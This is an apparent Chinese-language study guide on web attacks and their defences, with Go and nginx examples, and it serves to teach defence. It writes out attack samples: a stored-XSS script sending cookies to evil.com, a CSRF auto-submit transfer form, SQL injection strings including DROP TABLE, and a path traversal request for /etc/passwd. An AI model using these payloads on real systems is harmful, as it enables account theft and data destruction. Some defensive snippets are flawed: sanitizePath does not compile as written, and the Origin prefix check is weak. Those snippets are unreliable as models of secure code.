# 網路安全攻擊與防禦

- **難度**: 8
- **重要程度**: 5
- **標籤**: `安全`, `DDoS`, `XSS`, `CSRF`, `SQL Injection`, `攻擊防護`

## 問題詳述

解釋常見的網路安全攻擊類型（如 DDoS、XSS、CSRF、SQL Injection）的原理、危害，以及在實際系統中如何實施有效的防護措施。

### 測驗對應

- **Concept ID**: `concept.network.security.attack-mitigation`
- **Learning Objectives**:
  - `LO-1`: 能辨識 volumetric、protocol、application、SYN flood、XSS、CSRF 與注入的資源耗盡路徑。
  - `LO-2`: 能比較 anycast／清洗、WAF、rate limit、challenge、驗證、隔離與誤殺成本。
  - `LO-3`: 能在攻擊與合法尖峰混合時，以來源、租戶、端點與資源層級設計分層防禦和回復。
- **Prerequisites**: 可先閱讀 [HTTPS 與 TLS/SSL 原理](./https_tls_ssl.md)。
- **Quick Quiz**: [Q12](../../QUIZ/01_Networking.md#q12-網路攻擊與資源防護)
- **Hard Assessment**: [Network + OS Resilience Incident](../../QUIZ/Hard_Assessments/network_os_resilience_incident.md) (`assessment.network-os.resilience-incident.v1`)
- **Assessment Gate**: 完成本文與 Quick Quiz，並在 Hard Assessment 中以可驗證證據覆蓋本文的三項 Learning Objectives。
- **覆蓋題型**: `威脅模型、容量保護、分層防禦`

## 核心理論與詳解

### 1. 拒絕服務攻擊 (DoS/DDoS)

#### 攻擊原理

**DoS (Denial of Service)**: 單一來源大量請求，耗盡目標資源
**DDoS (Distributed DoS)**: 多個來源（殭屍網路）同時攻擊，規模更大

**常見類型**:

**1. SYN Flood (TCP 層)**
```
攻擊者發送大量 SYN 包（偽造源 IP）
伺服器回應 SYN-ACK 並等待 ACK
攻擊者不回應，伺服器半開連接堆積
→ 連接表溢出，無法接受新連接
```

**2. HTTP Flood (應用層)**
```
大量 HTTP 請求 (GET /resource)
消耗伺服器 CPU、記憶體、資料庫資源
→ 正常用戶無法訪問
```

**3. DNS 放大攻擊**
```
攻擊者偽造源 IP (受害者 IP)
向 DNS 伺服器查詢大記錄 (如 ANY)
DNS 伺服器回應大量資料到受害者
→ 頻寬耗盡 (放大倍數可達 50-100 倍)
```

#### 防護措施

**1. 流量清洗 (Scrubbing)**
- 透過專業的 DDoS 防護服務 (Cloudflare, Akamai)
- 識別並過濾惡意流量
- 只轉發合法流量到源站

**2. 速率限制 (Rate Limiting)**
```go
// 令牌桶算法
type RateLimiter struct {
    rate   time.Duration
    bucket chan struct{}
}

func (rl *RateLimiter) Allow() bool {
    select {
    case <-rl.bucket:
        return true
    default:
        return false
    }
}
```

**3. IP 黑名單/白名單**
```nginx
# Nginx
geo $blocked {
    default 0;
    203.0.113.0/24 1;  # 黑名單段
}

if ($blocked) {
    return 403;
}
```

**4. SYN Cookies**
- 不分配資源直到收到 ACK
- 防止 SYN Flood

**5. 負載均衡與自動擴展**
- 分散攻擊流量
- 自動擴展資源應對突發流量

### 2. 跨站腳本攻擊 (XSS)

#### 攻擊原理

攻擊者注入惡意 JavaScript 代碼，在受害者瀏覽器執行。

**類型 1: 反射型 XSS (Reflected)**
```
攻擊 URL:
https://example.com/search?q=<script>alert(document.cookie)</script>

伺服器直接回顯查詢參數:
<p>搜尋結果: <script>alert(document.cookie)</script></p>

瀏覽器執行惡意腳本 → 竊取 Cookie
```

**類型 2: 儲存型 XSS (Stored)**
```
攻擊者在留言板發布:
<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

惡意代碼存入資料庫
→ 所有訪問該頁面的用戶都受影響
```

**類型 3: DOM-based XSS**
```javascript
// 前端代碼
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

攻擊 URL:
https://example.com/#<img src=x onerror=alert(document.cookie)>
```

#### 防護措施

**1. 輸入驗證與過濾**
```go
import "html"

func sanitizeInput(input string) string {
    // HTML 實體編碼
    return html.EscapeString(input)
}

// <script> → &lt;script&gt;
```

**2. 輸出編碼**
- HTML 內容: HTML 編碼
- JavaScript 內容: JavaScript 編碼
- URL 參數: URL 編碼
- CSS 內容: CSS 編碼

**3. Content Security Policy (CSP)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'
```

**4. HttpOnly Cookie**
```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    HttpOnly: true,  // JavaScript 無法讀取
    Secure:   true,  // 只透過 HTTPS 傳輸
    SameSite: http.SameSiteStrictMode,
})
```

**5. 使用安全的 Template 引擎**
- Go: `html/template` (自動轉義)
- Python: Jinja2 (自動轉義)

### 3. 跨站請求偽造 (CSRF)

#### 攻擊原理

利用用戶已登入的身份，在用戶不知情的情況下執行操作。

**攻擊流程**:
```
1. 用戶登入 bank.com (獲得 Session Cookie)
2. 用戶訪問惡意網站 evil.com
3. evil.com 包含:
   <form action="https://bank.com/transfer" method="POST">
       <input name="to" value="attacker">
       <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
4. 表單自動提交到 bank.com
5. bank.com 驗證 Cookie (有效) → 執行轉帳 😱
```

#### 防護措施

**1. CSRF Token (推薦)**
```go
// 生成 Token
token := generateRandomToken()
session.Set("csrf_token", token)

// HTML 表單
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
    ...
</form>

// 驗證 Token
func validateCSRF(r *http.Request) bool {
    formToken := r.FormValue("csrf_token")
    sessionToken := session.Get("csrf_token")
    return formToken == sessionToken
}
```

**2. SameSite Cookie**
```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    SameSite: http.SameSiteStrictMode,  // 或 Lax
})
```

- `Strict`: Cookie 只在同站請求時發送
- `Lax`: 部分跨站請求可發送 (如 GET 導航)
- `None`: 所有請求都發送 (需要 Secure)

**3. Double Submit Cookie**
```go
// 設定 Cookie 和 Header
cookie := &http.Cookie{
    Name:  "csrf_token",
    Value: token,
}
http.SetCookie(w, cookie)

// 驗證時比較 Cookie 和 Header/Body 中的值
func validateDoubleSubmit(r *http.Request) bool {
    cookie, _ := r.Cookie("csrf_token")
    header := r.Header.Get("X-CSRF-Token")
    return cookie.Value == header
}
```

**4. 驗證 Referer/Origin Header**
```go
func validateOrigin(r *http.Request) bool {
    origin := r.Header.Get("Origin")
    referer := r.Header.Get("Referer")
    
    trustedOrigins := []string{"https://example.com"}
    
    for _, trusted := range trustedOrigins {
        if strings.HasPrefix(origin, trusted) || 
           strings.HasPrefix(referer, trusted) {
            return true
        }
    }
    return false
}
```

### 4. SQL 注入 (SQL Injection)

#### 攻擊原理

攻擊者透過輸入構造的 SQL 代碼，改變原有 SQL 查詢邏輯。

**範例**:
```go
// 危險代碼
username := r.FormValue("username")
password := r.FormValue("password")

query := "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

**攻擊輸入**:
```
username: admin' --
password: (任意)

實際執行的 SQL:
SELECT * FROM users WHERE username='admin' --' AND password='...'
                                         ↑
                                      註解掉後面

→ 無需密碼登入 admin 帳號
```

**更危險的攻擊**:
```
username: '; DROP TABLE users; --

實際執行:
SELECT * FROM users WHERE username=''; DROP TABLE users; --' AND password='...'
→ 刪除整個 users 表
```

#### 防護措施

**1. 參數化查詢 (Prepared Statements) - 最佳方案**
```go
// 正確做法
query := "SELECT * FROM users WHERE username=? AND password=?"
row := db.QueryRow(query, username, password)

// SQL 引擎不會將參數當作 SQL 代碼解析
```

**2. ORM 框架**
```go
// 使用 GORM
var user User
db.Where("username = ? AND password = ?", username, password).First(&user)

// ORM 自動處理參數化
```

**3. 輸入驗證**
```go
func validateUsername(username string) bool {
    // 只允許字母、數字、底線
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9_]+$`, username)
    return matched
}
```

**4. 最小權限原則**
```sql
-- 應用資料庫帳號只給必要權限
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- 不給 DROP, CREATE 等危險權限
```

**5. 錯誤處理**
```go
// 不要洩露資料庫錯誤細節
if err != nil {
    log.Error(err)  // 記錄詳細錯誤
    http.Error(w, "Internal Server Error", 500)  // 返回通用錯誤
}
```

### 5. 其他常見攻擊

#### 中間人攻擊 (MITM)

**攻擊**: 攔截和篡改通信

**防護**:
- **使用 HTTPS**: 加密傳輸
- **HSTS**: 強制 HTTPS
- **證書固定 (Certificate Pinning)**: 移動應用內建信任的證書

#### 會話劫持 (Session Hijacking)

**攻擊**: 竊取 Session ID，冒充用戶

**防護**:
- **Secure Cookie**: 只透過 HTTPS 傳輸
- **HttpOnly Cookie**: 防止 XSS 竊取
- **定期更新 Session ID**
- **綁定 IP 或 User-Agent** (可選，影響用戶體驗)

#### 點擊劫持 (Clickjacking)

**攻擊**: 透過透明 iframe 誘騙用戶點擊

**防護**:
```http
X-Frame-Options: DENY
# 或
Content-Security-Policy: frame-ancestors 'none'
```

#### 目錄遍歷 (Path Traversal)

**攻擊**:
```
GET /download?file=../../etc/passwd
```

**防護**:
```go
func sanitizePath(filepath string) (string, error) {
    // 清理路徑
    clean := filepath.Clean(filepath)
    
    // 檢查是否包含 ..
    if strings.Contains(clean, "..") {
        return "", errors.New("invalid path")
    }
    
    // 限制在特定目錄
    baseDir := "/var/www/files"
    fullPath := filepath.Join(baseDir, clean)
    
    // 確保結果路徑在 baseDir 內
    if !strings.HasPrefix(fullPath, baseDir) {
        return "", errors.New("invalid path")
    }
    
    return fullPath, nil
}
```

### 6. 安全開發實踐

#### 輸入驗證原則

- **白名單優於黑名單**: 定義允許的輸入，而非禁止的輸入
- **類型驗證**: 確保資料類型正確
- **長度限制**: 防止緩衝區溢出
- **格式驗證**: 使用正則表達式驗證格式

#### 輸出編碼原則

- **Context-aware 編碼**: 根據輸出位置選擇編碼方式
- **使用安全的 API**: 避免直接字串拼接

#### 認證與授權

- **強密碼策略**: 最小長度、複雜度要求
- **密碼雜湊**: 使用 bcrypt, Argon2 等強雜湊算法
- **多因素認證 (MFA)**: 增加額外驗證層
- **最小權限原則**: 只給必要的權限
- **定期審計**: 檢查權限配置

#### 日誌與監控

- **記錄安全事件**: 登入失敗、權限錯誤、異常訪問
- **不記錄敏感資訊**: 密碼、信用卡號
- **實時告警**: 異常活動及時通知
- **定期審計日誌**: 發現潛在威脅

## 總結

網路安全是一個持續演進的領域：

1. **多層防禦**: 不要依賴單一防護措施
2. **預防優於修復**: 在設計階段就考慮安全
3. **持續學習**: 關注最新的安全威脅和防護技術
4. **安全意識**: 團隊所有成員都應具備安全意識
5. **定期審計**: 定期檢查和更新安全措施

作為資深後端工程師，你需要：
- 深入理解常見攻擊的原理和危害
- 能夠實施有效的防護措施
- 在開發過程中遵循安全最佳實踐
- 建立安全監控和應急響應機制
- 持續關注安全漏洞和更新
